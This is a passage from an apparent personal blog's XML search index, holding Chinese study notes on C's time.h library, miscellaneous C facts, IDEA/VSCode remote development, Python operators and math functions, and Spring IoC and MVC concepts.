</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>size_t</strong>  是无符号整数类型，它是 <strong>sizeof</strong> 关键字的结果。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>clock_t</strong>  这是一个适合存储处理器时间的类型。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><strong>time_t is</strong>  这是一个适合存储日历时间类型。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><strong>struct tm</strong>  这是一个用来保存时间和日期的结构。</td>
</tr>
</tbody></table>
<p>tm 结构的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct tm &#123;</span><br><span class="line">   int tm_sec;         /* 秒，范围从 0 到 59        */</span><br><span class="line">   int tm_min;         /* 分，范围从 0 到 59        */</span><br><span class="line">   int tm_hour;        /* 小时，范围从 0 到 23        */</span><br><span class="line">   int tm_mday;        /* 一月中的第几天，范围从 1 到 31    */</span><br><span class="line">   int tm_mon;         /* 月，范围从 0 到 11        */</span><br><span class="line">   int tm_year;        /* 自 1900 年起的年数        */</span><br><span class="line">   int tm_wday;        /* 一周中的第几天，范围从 0 到 6    */</span><br><span class="line">   int tm_yday;        /* 一年中的第几天，范围从 0 到 365    */</span><br><span class="line">   int tm_isdst;       /* 夏令时                */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="库宏-13"><a href="#库宏-13" class="headerlink" title="库宏"></a>库宏</h2><p>下面是头文件 time.h 中定义的宏：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">宏 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><strong>NULL</strong> 这个宏是一个空指针常量的值。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><strong>CLOCKS_PER_SEC</strong>  这个宏表示每秒的处理器时钟个数。</td>
</tr>
</tbody></table>
<h2 id="库函数-8"><a href="#库函数-8" class="headerlink" title="库函数"></a>库函数</h2><p>下面是头文件 time.h 中定义的函数：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">函数 &amp; 描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-asctime.html">char *asctime(const struct tm *timeptr)</a> 返回一个指向字符串的指针，它代表了结构 timeptr 的日期和时间。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-clock.html">clock_t clock(void)</a> 返回程序执行起（一般为程序的开头），处理器时钟所使用的时间。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-ctime.html">char *ctime(const time_t *timer)</a> 返回一个表示当地时间的字符串，当地时间是基于参数 timer。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-difftime.html">double difftime(time_t time1, time_t time2)</a> 返回 time1 和 time2 之间相差的秒数 (time1-time2)。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-gmtime.html">struct tm *gmtime(const time_t *timer)</a> timer 的值被分解为 tm 结构，并用协调世界时（UTC）也被称为格林尼治标准时间（GMT）表示。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-localtime.html">struct tm *localtime(const time_t *timer)</a> timer 的值被分解为 tm 结构，并用本地时区表示。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-mktime.html">time_t mktime(struct tm *timeptr)</a> 把 timeptr 所指向的结构转换为一个依据本地时区的 time_t 值。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-strftime.html">size_t strftime(char *str, size_t maxsize, const char *format, const struct tm *timeptr)</a> 根据 format 中定义的格式化规则，格式化结构 timeptr 表示的时间，并把它存储在 str 中。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><a href="https://www.runoob.com/cprogramming/c-function-time.html">time_t time(time_t *timer)</a> 计算当前日历时间，并把它编码成 time_t 格式。</td>
</tr>
</tbody></table>
<h1 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h1><ol>
<li><p>库函数在LIB目录,头文件在INCLUDE目录,编译器的连接部分负责找到您所需要的库代码.头文件指引编译器把您的程序正确地组合在一起</p>
</li>
<li><p>getchar()读取一次按键输入</p>
</li>
<li><p>c99标准允许一个标识符最多可以有63个字符</p>
</li>
<li><p>c语言的变量名区分大小写</p>
</li>
<li><p>发现错误的位置要比真正出现错误的位置滞后一行</p>
</li>
<li><p>%hd :已十进制显示short整数, %ho表示以八进制显示short整数</p>
</li>
<li><p>double和float: double精度高,有效数字16位,float精度7位. 但double消耗内存是float的两倍,double运算速度比float慢很多. 尽量使用float</p>
</li>
<li><p>不初始化数组,数组元素和为初始化的普通变量一样. 部分初始化,未初始化的元素被设置为0</p>
</li>
<li><p>!&#x3D; 运算符的优先级比&#x3D;高</p>
</li>
<li><p>字符实际上是作为整数被存储的</p>
</li>
<li><p>c语言不能保证复杂表达式的那一部分首先被求值</p>
</li>
<li><p>goto语言最好不要用</p>
</li>
<li><p><code>#include</code> 不是c语言的语句 #表示这一行是在编译器接手之前由c预处理的语句</p>
</li>
<li><p>main函数返回值是返回操作系统</p>
</li>
<li><p>所有的c程序都是从main函数开始执行,不管它放在程序文件中的什么位置</p>
</li>
<li><p>默认条件下,编译器将浮点常量当做double类型</p>
</li>
<li><p>54.3L表示long double, 54.3F表示float</p>
</li>
<li><p>一个字符串只是一个参数</p>
</li>
<li><p>float类型区只能保证前6位是精确的</p>
</li>
<li><p>scanf会在遇到第一个空白字符,制表符或者换行符处停止读取</p>
</li>
<li><p>print先把变量放到堆栈,然后再按照对应格式去读取</p>
</li>
<li><p>如果输入错误,print会返回一个负值,print返回打印字符的个数</p>
</li>
<li><p>不能在字符串中通过回车键来产生实际的换行字符</p>
</li>
<li><p>scanf使用指向变量的指针,scanf返回成功读入的项目个数</p>
</li>
<li><p>print %*d 跳过第一个参数,输入第二个</p>
</li>
<li><p>scanf （“%*d， %*d，%d“，&amp;n）跳过两个整数，并把第三个整数赋值给n</p>
</li>
<li><p>当数值数目少于数组元素时，编译器初始化数组元素为0，若未初始化，则不初始化为0</p>
</li>
<li><p>数组大小只能用常量表示，不能用变量</p>
</li>
<li><p>const只能在声明时赋值，const修饰的数组元素会被当成常量来处理</p>
</li>
<li><p>编译器不检查索引的合法性</p>
</li>
<li><p>数组标记实际上是一种变相使用数组标记的形式</p>
</li>
<li><p>对一个指针加1的结果是对该指针增加一个存储单元</p>
</li>
<li><p>当ar是一个指针变量时，才能使用ar++这样的表达式</p>
</li>
<li><p>可以使用关系运算符来比较两个指针的值，前提是两个指针具有相同的类型</p>
</li>
<li><p>const double *pc &#x3D; rates; pc &#x3D; locked;</p>
</li>
<li><p>只有非常量数据的地址才可以赋给普通的指针</p>
</li>
<li><p>Double * const pc &#x3D; rates; pc指针不能改变</p>
</li>
<li><p>const double * const pc &#x3D; rates；值和指针都不能改变</p>
</li>
</ol>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>使用IDEA配合VSCode远程开发</title>
    <url>/2021/12/22/Java/%E4%BD%BF%E7%94%A8Idea%E9%85%8D%E5%90%88vscode%E8%BF%9C%E7%A8%8B%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h1 id="使用IDEA配合VSCode远程开发"><a href="#使用IDEA配合VSCode远程开发" class="headerlink" title="使用IDEA配合VSCode远程开发"></a>使用IDEA配合VSCode远程开发</h1><h2 id="IDEA配置远程上传代码"><a href="#IDEA配置远程上传代码" class="headerlink" title="IDEA配置远程上传代码"></a>IDEA配置远程上传代码</h2><p>先确保本地和开发机上有同一份代码。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212343408.png" alt="image-20211221234331366"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212344773.png" alt="image-20211221234439734"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212346351.png" alt="image-20211221234657302"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212358451.png" alt="image-20211221235744141"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220003470.png" alt="image-20211222000346432"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220005712.png" alt="image-20211222000526639"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220006550.png" alt="image-20211222000619501"></p>
<h2 id="VsCode远程调试"><a href="#VsCode远程调试" class="headerlink" title="VsCode远程调试"></a>VsCode远程调试</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220009126.png" alt="image-20211222000914072"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220010818.png" alt="image-20211222001022768"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220011260.png" alt="image-20211222001153213"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220013399.png" alt="image-20211222001322347"></p>
<p>需要升级git版本</p>
<p><a href="https://www.cnblogs.com/miskis/p/9816135.html">VsCode搭建Java开发环境</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Python</title>
    <url>/2021/12/21/Python/Python/</url>
    <content><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多行语句</span></span><br><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br><span class="line"><span class="comment">#语句中包含 [], &#123;&#125; 或 () 括号就不需要使用多行连接符</span></span><br><span class="line">days = [<span class="string">&#x27;Monday&#x27;</span>, <span class="string">&#x27;Tuesday&#x27;</span>, <span class="string">&#x27;Wednesday&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Thursday&#x27;</span>, <span class="string">&#x27;Friday&#x27;</span>]</span><br><span class="line"><span class="comment">#2的3次幂</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">c = a**b </span><br><span class="line"></span><br><span class="line"><span class="comment">#取整除</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">5</span></span><br><span class="line">c = a//b</span><br></pre></td></tr></table></figure>





<h2 id="Python赋值运算符"><a href="#Python赋值运算符" class="headerlink" title="Python赋值运算符"></a>Python赋值运算符</h2><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x3D;</td>
<td align="left">简单的赋值运算符</td>
<td align="left">c &#x3D; a + b 将 a + b 的运算结果赋值为 c</td>
</tr>
<tr>
<td align="left">+&#x3D;</td>
<td align="left">加法赋值运算符</td>
<td align="left">c +&#x3D; a 等效于 c &#x3D; c + a</td>
</tr>
<tr>
<td align="left">-&#x3D;</td>
<td align="left">减法赋值运算符</td>
<td align="left">c -&#x3D; a 等效于 c &#x3D; c - a</td>
</tr>
<tr>
<td align="left">*&#x3D;</td>
<td align="left">乘法赋值运算符</td>
<td align="left">c *&#x3D; a 等效于 c &#x3D; c * a</td>
</tr>
<tr>
<td align="left">&#x2F;&#x3D;</td>
<td align="left">除法赋值运算符</td>
<td align="left">c &#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F; a</td>
</tr>
<tr>
<td align="left">%&#x3D;</td>
<td align="left">取模赋值运算符</td>
<td align="left">c %&#x3D; a 等效于 c &#x3D; c % a</td>
</tr>
<tr>
<td align="left">**&#x3D;</td>
<td align="left">幂赋值运算符</td>
<td align="left">c **&#x3D; a 等效于 c &#x3D; c ** a</td>
</tr>
<tr>
<td align="left">&#x2F;&#x2F;&#x3D;</td>
<td align="left">取整除赋值运算符</td>
<td align="left">c &#x2F;&#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F;&#x2F; a</td>
</tr>
<tr>
<td align="left">:&#x3D;</td>
<td align="left">海象运算符，可在表达式内部为变量赋值。<strong>Python3.8 版本新增运算符</strong>。</td>
<td align="left">在这个示例中，赋值表达式可以避免调用 len() 两次:<code>if (n := len(a)) &gt; 10:    print(f&quot;List is too long (&#123;n&#125; elements, expected &lt;= 10)&quot;)</code></td>
</tr>
</tbody></table>
<h2 id="Python位运算符"><a href="#Python位运算符" class="headerlink" title="Python位运算符"></a>Python位运算符</h2><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;</td>
<td align="left">按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0</td>
<td align="left">(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100</td>
</tr>
<tr>
<td align="left">|</td>
<td align="left">按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。</td>
<td align="left">(a | b) 输出结果 61 ，二进制解释： 0011 1101</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">按位异或运算符：当两对应的二进位相异时，结果为1</td>
<td align="left">(a ^ b) 输出结果 49 ，二进制解释： 0011 0001</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。**~x** 类似于 <strong>-x-1</strong></td>
<td align="left">(~a ) 输出结果 -61 ，二进制解释： 1100 0011， 在一个有符号二进制数的补码形式。</td>
</tr>
<tr>
<td align="left">&lt;&lt;</td>
<td align="left">左移动运算符：运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td>
<td align="left">a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000</td>
</tr>
<tr>
<td align="left">&gt;&gt;</td>
<td align="left">右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数</td>
<td align="left">a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111</td>
</tr>
</tbody></table>
<h2 id="Python逻辑运算符"><a href="#Python逻辑运算符" class="headerlink" title="Python逻辑运算符"></a>Python逻辑运算符</h2><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">逻辑表达式</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">and</td>
<td align="left">x and y</td>
<td align="left">布尔”与” - 如果 x 为 False，x and y 返回 x 的值，否则返回 y 的计算值。</td>
<td align="left">(a and b) 返回 20。</td>
</tr>
<tr>
<td align="left">or</td>
<td align="left">x or y</td>
<td align="left">布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。</td>
<td align="left">(a or b) 返回 10。</td>
</tr>
<tr>
<td align="left">not</td>
<td align="left">not x</td>
<td align="left">布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td>
<td align="left">not(a and b) 返回 False</td>
</tr>
</tbody></table>
<h2 id="Python成员运算符"><a href="#Python成员运算符" class="headerlink" title="Python成员运算符"></a>Python成员运算符</h2><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">in</td>
<td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td align="left">x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td align="left">not in</td>
<td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td align="left">x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td>
</tr>
</tbody></table>
<h2 id="Python身份运算符"><a href="#Python身份运算符" class="headerlink" title="Python身份运算符"></a>Python身份运算符</h2><p>身份运算符用于比较两个对象的存储单元</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">is</td>
<td align="left">is 是判断两个标识符是不是引用自一个对象</td>
<td align="left"><strong>x is y</strong>, 类似 <strong>id(x) &#x3D;&#x3D; id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td>
</tr>
<tr>
<td align="left">is not</td>
<td align="left">is not 是判断两个标识符是不是引用自不同对象</td>
<td align="left"><strong>x is not y</strong> ， 类似 **id(a) !&#x3D; id(b)**。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td>
</tr>
</tbody></table>
<h2 id="Python运算符优先级"><a href="#Python运算符优先级" class="headerlink" title="Python运算符优先级"></a>Python运算符优先级</h2><p>以下表格列出了从最高到最低优先级的所有运算符：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">**</td>
<td align="left">指数 (最高优先级)</td>
</tr>
<tr>
<td align="left">~ + -</td>
<td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>
</tr>
<tr>
<td align="left">* &#x2F; % &#x2F;&#x2F;</td>
<td align="left">乘，除，求余数和取整除</td>
</tr>
<tr>
<td align="left">+ -</td>
<td align="left">加法减法</td>
</tr>
<tr>
<td align="left">&gt;&gt; &lt;&lt;</td>
<td align="left">右移，左移运算符</td>
</tr>
<tr>
<td align="left">&amp;</td>
<td align="left">位 ‘AND’</td>
</tr>
<tr>
<td align="left">^ |</td>
<td align="left">位运算符</td>
</tr>
<tr>
<td align="left">&lt;&#x3D; &lt; &gt; &gt;&#x3D;</td>
<td align="left">比较运算符</td>
</tr>
<tr>
<td align="left">&#x3D;&#x3D; !&#x3D;</td>
<td align="left">等于运算符</td>
</tr>
<tr>
<td align="left">&#x3D; %&#x3D; &#x2F;&#x3D; &#x2F;&#x2F;&#x3D; -&#x3D; +&#x3D; *&#x3D; **&#x3D;</td>
<td align="left">赋值运算符</td>
</tr>
<tr>
<td align="left">is is not</td>
<td align="left">身份运算符</td>
</tr>
<tr>
<td align="left">in not in</td>
<td align="left">成员运算符</td>
</tr>
<tr>
<td align="left">not and or</td>
<td align="left">逻辑运算符</td>
</tr>
</tbody></table>
<h2 id="Python数学函数"><a href="#Python数学函数" class="headerlink" title="Python数学函数"></a>Python数学函数</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">返回值 ( 描述 )</th>
</tr>
</thead>
<tbody><tr>
<td align="left">abs(x)</td>
<td align="left">返回数字的绝对值，如abs(-10) 返回 10</td>
</tr>
<tr>
<td align="left">ceil(x)</td>
<td align="left">返回数字的上入整数，如math.ceil(4.1) 返回 5</td>
</tr>
<tr>
<td align="left">cmp(x, y)</td>
<td align="left">如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1</td>
</tr>
<tr>
<td align="left">exp(x)</td>
<td align="left">返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045</td>
</tr>
<tr>
<td align="left">fabs(x)</td>
<td align="left">返回数字的绝对值，如math.fabs(-10) 返回10.0</td>
</tr>
<tr>
<td align="left">floor(x)</td>
<td align="left">返回数字的下舍整数，如math.floor(4.9)返回 4</td>
</tr>
<tr>
<td align="left">log(x)</td>
<td align="left">如math.log(math.e)返回1.0,math.log(100,10)返回2.0</td>
</tr>
<tr>
<td align="left">log10(x)</td>
<td align="left">返回以10为基数的x的对数，如math.log10(100)返回 2.0</td>
</tr>
<tr>
<td align="left">max(x1, x2,…)</td>
<td align="left">返回给定参数的最大值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">min(x1, x2,…)</td>
<td align="left">返回给定参数的最小值，参数可以为序列。</td>
</tr>
<tr>
<td align="left">modf(x)</td>
<td align="left">返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。</td>
</tr>
<tr>
<td align="left">pow(x, y)</td>
<td align="left">x**y 运算后的值。</td>
</tr>
<tr>
<td align="left">round(x [,n])</td>
<td align="left">返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td>
</tr>
<tr>
<td align="left">sqrt(x)</td>
<td align="left">返回数字x的平方根</td>
</tr>
</tbody></table>
<hr>
<h2 id="Python随机数函数"><a href="#Python随机数函数" class="headerlink" title="Python随机数函数"></a>Python随机数函数</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">choice(seq)</td>
<td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，从0到9中随机挑选一个整数。</td>
</tr>
<tr>
<td align="left">randrange ([start,] stop [,step])</td>
<td align="left">从指定范围内，按指定基数递增的集合中获取一个随机数，基数默认值为 1</td>
</tr>
<tr>
<td align="left">random()</td>
<td align="left">随机生成下一个实数，它在[0,1)范围内。</td>
</tr>
<tr>
<td align="left">seed([x])</td>
<td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，Python会帮你选择seed。</td>
</tr>
<tr>
<td align="left">shuffle(lst)</td>
<td align="left">将序列的所有元素随机排序</td>
</tr>
<tr>
<td align="left">uniform(x, y)</td>
<td align="left">随机生成下一个实数，它在[x,y]范围内。</td>
</tr>
</tbody></table>
<h2 id="Python三角函数"><a href="#Python三角函数" class="headerlink" title="Python三角函数"></a>Python三角函数</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">acos(x)</td>
<td align="left">返回x的反余弦弧度值。</td>
</tr>
<tr>
<td align="left">asin(x)</td>
<td align="left">返回x的反正弦弧度值。</td>
</tr>
<tr>
<td align="left">atan(x)</td>
<td align="left">返回x的反正切弧度值。</td>
</tr>
<tr>
<td align="left">atan2(y, x)</td>
<td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td>
</tr>
<tr>
<td align="left">cos(x)</td>
<td align="left">返回x的弧度的余弦值。</td>
</tr>
<tr>
<td align="left">hypot(x, y)</td>
<td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td>
</tr>
<tr>
<td align="left">sin(x)</td>
<td align="left">返回的x弧度的正弦值。</td>
</tr>
<tr>
<td align="left">tan(x)</td>
<td align="left">返回x弧度的正切值。</td>
</tr>
<tr>
<td align="left">degrees(x)</td>
<td align="left">将弧度转换为角度,如degrees(math.pi&#x2F;2) ， 返回90.0</td>
</tr>
<tr>
<td align="left">radians(x)</td>
<td align="left">将角度转换为弧度</td>
</tr>
</tbody></table>
<h2 id="Python数学常量"><a href="#Python数学常量" class="headerlink" title="Python数学常量"></a>Python数学常量</h2><table>
<thead>
<tr>
<th align="left">常量</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pi</td>
<td align="left">数学常量 pi（圆周率，一般以π来表示）</td>
</tr>
<tr>
<td align="left">e</td>
<td align="left">数学常量 e，e即自然常数（自然常数）。</td>
</tr>
</tbody></table>
<h2 id="Python-转义字符"><a href="#Python-转义字符" class="headerlink" title="Python 转义字符"></a>Python 转义字符</h2><p>在需要在字符中使用特殊字符时，python 用反斜杠 *<em>*</em> 转义字符。如下表：</p>
<table>
<thead>
<tr>
<th align="left">转义字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">(在行尾时)</td>
<td align="left">续行符</td>
</tr>
<tr>
<td align="left">\</td>
<td align="left">反斜杠符号</td>
</tr>
<tr>
<td align="left">&#39;</td>
<td align="left">单引号</td>
</tr>
<tr>
<td align="left">&quot;</td>
<td align="left">双引号</td>
</tr>
<tr>
<td align="left">\a</td>
<td align="left">响铃</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">退格(Backspace)</td>
</tr>
<tr>
<td align="left">\e</td>
<td align="left">转义</td>
</tr>
<tr>
<td align="left">\000</td>
<td align="left">空</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">换行</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">纵向制表符</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">横向制表符</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">回车</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">换页</td>
</tr>
<tr>
<td align="left">\oyy</td>
<td align="left">八进制数，y 代表 0~7 的字符，例如：\012 代表换行。</td>
</tr>
<tr>
<td align="left">\xyy</td>
<td align="left">十六进制数，以 \x 开头，yy代表的字符，例如：\x0a代表换行</td>
</tr>
<tr>
<td align="left">\other</td>
<td align="left">其它的字符以普通格式输出</td>
</tr>
</tbody></table>
<h2 id="Python字符串运算符"><a href="#Python字符串运算符" class="headerlink" title="Python字符串运算符"></a>Python字符串运算符</h2><table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">+</td>
<td align="left">字符串连接</td>
<td align="left">&gt;&gt;&gt;a + b ‘HelloPython’</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">重复输出字符串</td>
<td align="left">&gt;&gt;&gt;a * 2 ‘HelloHello’</td>
</tr>
<tr>
<td align="left">[]</td>
<td align="left">通过索引获取字符串中字符</td>
<td align="left">&gt;&gt;&gt;a[1] ‘e’</td>
</tr>
<tr>
<td align="left">[ : ]</td>
<td align="left">截取字符串中的一部分</td>
<td align="left">&gt;&gt;&gt;a[1:4] ‘ell’</td>
</tr>
<tr>
<td align="left">in</td>
<td align="left">成员运算符 - 如果字符串中包含给定的字符返回 True</td>
<td align="left">&gt;&gt;&gt;”H” in a True</td>
</tr>
<tr>
<td align="left">not in</td>
<td align="left">成员运算符 - 如果字符串中不包含给定的字符返回 True</td>
<td align="left">&gt;&gt;&gt;”M” not in a True</td>
</tr>
<tr>
<td align="left">r&#x2F;R</td>
<td align="left">原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母”r”（可以大小写）以外，与普通字符串有着几乎完全相同的语法。</td>
<td align="left">&gt;&gt;&gt;print r’\n’ \n &gt;&gt;&gt; print R’\n’ \n</td>
</tr>
<tr>
<td align="left">%</td>
<td align="left">格式字符串</td>
<td align="left">请看下一章节</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring</title>
    <url>/2021/12/21/leyou/Java%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>通过beandefinitionReader 来读取xml、注解或java配置类, 然后放到beandefinition,如果实现了beanfactorypostprocessor接口,则需要另一步处理, 通过beanfactory来反射创建对象,beanPostprocessor后置处理器,增强器;</p>
<p>实现了aware接口就是设置bean的一些属性, 比如想要获取当前对象的工厂, 就需要实现BeanFactoryAware接口, 然后就能通过bean.getBeanFactory()获取到;</p>
<p>作为一个框架,扩展性是必须要重点考虑的东西, 例如读取完了xml后,要修改bean的属性, </p>
<p>有了beanFactory为什么还要factoryBean</p>
<p>假如正常工厂生产正常人, 突然需要几个三头六臂的人,这个时候不能去建一个工厂,就需要用到factorybean</p>
<p>在整个spring框架中, 如果想在某些阶段做一些独特的事情, 应该怎么做? </p>
<p>监听器: 观察者模式</p>
<h2 id="什么是Spring-MVC-？"><a href="#什么是Spring-MVC-？" class="headerlink" title="什么是Spring MVC ？"></a>什么是Spring MVC ？</h2><ul>
<li>Spring MVC是一个基于MVC架构的用来简化web应用程序开发的应用开发框架，它是Spring的一部分，它和Struts2一样都属于表现层的框架。</li>
<li>MVC（Model模型 View 视图 Controller 控制器）：这是一种软件架构思想，是一种开发模式，将软件划分为三种不同类型的模块，分别是模型，视图，和控制器。 模型：用于封装业务逻辑处理（java类）； 视图：用于数据展现和操作界面（Servlet）； 控制器：用于协调视图和模型（jsp）； 处理流程：视图将请求发送给控制器，由控制器选择对应的模型来处理；模型将处理结果交给控制器，控制器选择合适的视图来展现处理结果；</li>
</ul>
<h2 id="IOC和AOP"><a href="#IOC和AOP" class="headerlink" title="IOC和AOP"></a>IOC和AOP</h2><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><p>IoC（Inverse of Control:控制反转）是一种<strong>设计思想</strong>，就是 <strong>将原本在程序中手动创建对象的控制权，交由Spring框架来管理。</strong> IoC 在其他语言中也有应用，并非 Spring 特有。 <strong>IoC 容器是 Spring 用来实现 IoC 的载体， IoC 容器实际上就是个Map（key，value）,Map 中存放的是各种对象。</strong></p>
